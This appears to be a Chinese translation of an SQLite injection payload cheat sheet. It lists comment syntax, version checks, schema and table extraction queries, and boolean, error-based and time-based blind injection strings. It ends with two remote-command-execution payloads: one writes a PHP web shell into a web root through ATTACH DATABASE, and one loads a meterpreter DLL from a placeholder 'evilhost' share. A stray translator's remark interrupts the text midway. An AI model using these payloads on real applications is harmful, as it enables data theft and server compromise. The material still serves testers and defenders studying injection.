# SQLite 注入

## 摘要

* [SQLite 注释](#sqlite-comments)
* [SQLite 版本](#sqlite-version)
* [基于字符串 - 提取数据库结构](#string-based---extract-database-structure)
* [基于整数/字符串 - 提取表名](#integerstring-based---extract-table-name)
* [基于整数/字符串 - 提取列名](#integerstring-based---extract-column-name)
* [布尔型 - 计算表的数量](#boolean---count-number-of-tables)
* [布尔型 - 枚举表名](#boolean---enumerating-table-name)
* [布尔型 - 提取信息](#boolean---extract-info)
* [布尔型 - 基于错误](#boolean---error-based)
* [基于时间](#time-based)
* [使用 SQLite 命令执行远程命令 - 附加数据库](#remote-command-execution-using-sqlite-command---attach-database)
* [使用 SQLite 命令执行远程命令 - 加载扩展](#remote-command-execution-using-sqlite-command---load_extension)
* [参考资料](#references)

## SQLite 注释

```sql
--
/**/
```

## SQLite 版本

```sql
select sqlite_version();
```

## 基于字符串 - 提取数据库结构

```sql
SELECT sql FROM sqlite_schema
```

## 基于整数/字符串 - 提取表名

```sql
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

## 基于整数/字符串 - 提取列名

```sql
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```

为了更清晰的输出

```sql
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

更清晰的输出

```sql
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
```

## 布尔型 - 计算表的数量

```sql
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
```

根据您提供的文档内容，以下是翻译：

## 布尔值 - 枚举表名

```sql
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
```

## 布尔值 - 提取信息

```sql
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## 布尔值 - 提取信息（排序）

```sql
CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END
```

## 布尔值 - 基于错误

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## 基于时间

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

## 使用SQLite命令执行远程命令 - 附加数据库

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

## 使用SQLite命令执行远程命令 - 加载扩展

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

注意：默认情况下此组件是禁用的

## 参考资料

[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
[SQLite Error Based Injection for Enumeration](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
